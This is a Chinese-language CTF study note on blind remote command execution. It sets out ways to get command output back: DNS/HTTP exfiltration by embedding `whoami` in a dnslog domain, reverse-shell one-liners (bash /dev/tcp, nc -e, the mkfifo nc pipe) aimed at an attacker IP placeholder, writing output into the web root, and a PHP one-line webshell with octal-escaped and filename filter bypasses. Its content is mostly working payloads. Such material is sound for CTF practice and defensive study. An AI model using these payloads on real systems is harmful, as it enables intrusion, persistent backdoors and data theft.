# 无回显 RCE

## 定义

命令真执行了，但是结果不在你看得见的地方

- 程序本身不输出：如 PHP `exec()`，它只返回最后一行作为返回值，**不打印**
- 输出被丢弃：`>/dev/null 2>&1`
- 输出被过滤或截断

三种解法不一样


## 四条通道

**① 反弹 shell（最直接）**

把 shell 弹到自己的机器上，之后想执行什么就直接执行
需要有一台公网 ip 的机器，门槛比较高

**② 出网外带**：DNS / HTTP，把结果塞进请求里带出去

**③ 时间侧信道**：只能证明“执行了”
**④ 本地副作用**：写文件、写计划任务、改配置


## DNS 外带
dnslog 就是我们发起请求的目标不是 IP 地址而是域名的话，就一定会发生一次域名解析，那么假如我们有一个可控的二级域名，那么当它向下一层域名发起解析的时候，我们就能拿到它的域名解析请求
```bash
ping -c 1 `whoami`.你的平台域名
curl `whoami`.你的平台域名
```
平台：dnslog.cn / ceye / Burp Collaborator / interactsh。
不同的操作系统对命令的解析方式不同
```
windows在命令上使用%     如 %variable%.dnslog.com    
linux上使用反引号  如 `variable`.dnslog.com
```
- **多行输出只有第一行有效** —— 换行会破坏域名结构，塞不进去
- **特殊字符非法** —— 域名只允许字母、数字、连字符
- **长度有限** —— 单级标签 ≤ 63 字符，整个域名 ≤ 253 字符，长数据要分段
- **不出网就全部失效**


## 反弹 shell


几种写法
```bash
bash -i >& /dev/tcp/你的IP/端口 0>&1

nc -e /bin/sh 你的IP 端口

# 目标 nc 没有 -e 时（很常见）用这个
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 你的IP 端口 > /tmp/f
```

`dash` 是另一个实现，极小极快，**功能少**

## 本地副作用

### 第一种形态
```bash
你的命令 | tee /var/www/html/x.txt
```

`txt` 会原样返回内容
`php` 会执行里面的内容
文件名也会被过滤

有以下等同形式
```
tee > dd sed
```

### 第二种

造一个新入口，写一个一句话木马
（webshell）

```php
<?php system($_GET[1]); ?>
```
有些时候会强制你走第一种形态，但可以绕过
比如 
用 `\` 绕过 php: `p\hp`
用 `printf` 的八进制转义
```bash
printf '\074\077\160\150\160\040\163\171\163\164\145\155\050\044\137\107\105\124\133\061\135\051\073\077\076'
```
绕过 `<`、`>` 等
```bash
printf '\074\077...' | tee x.\p\hp
```

`0` 不是标记，是那三位八进制数里的一个数字 八进制不需要标记，因为 printf 默认就按八进制读；需要标记的是十六进制（`\x`） 补零到三位是为了让解析器停在正确的位置
当然也有 c 语言习惯的问题

[[SWPUCTF 2021 新生赛]finalrce - CTF 题目 - NSSCTF](https://www.nssctf.cn/problem/438)
这道题可以用这个进行非预期解
- **双引号里**：`\` 对某些字符仍然是转义符
- **单引号里**：`\` 完全原样保留，**原封不动传给目标程序**
- 有 `\`，`printf` 知道后面是**八进制编码**，解码成对应的字节

~~所以用 printf 必须用单引号，~~
可以使用双引号，只要不涉及特殊转义字符
